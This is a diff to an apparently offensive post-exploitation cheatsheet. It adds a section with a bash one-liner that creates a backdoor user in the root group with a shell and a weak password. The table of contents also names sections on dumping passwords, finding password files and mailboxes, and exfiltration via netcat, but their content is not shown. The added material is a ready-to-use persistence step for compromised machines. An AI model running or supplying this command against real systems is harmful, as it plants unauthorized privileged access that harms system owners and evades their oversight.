@@ -5,11 +5,17 @@
 </p>
 
 # Cheatsheets - Effect
+* [One-liner: useradd and chpasswd](#one-liner-useradd-and-chpasswd)
 * [Dump Passwords](#dump-passwords)
 * [Find Password Files](#find-password-files)
 * [Find Emailboxes](#find-emailboxes)
 * [Get Network Connections](#get-network-connections)
 * [Exfil via Netcat](#exfil-via-netcat)
+
+## One-liner: useradd and chpasswd
+```bash
+useradd victor -g root -s /bin/bash && echo victor:1337 | chpasswd
+```
 
 ## Dump Passwords
 ```bash
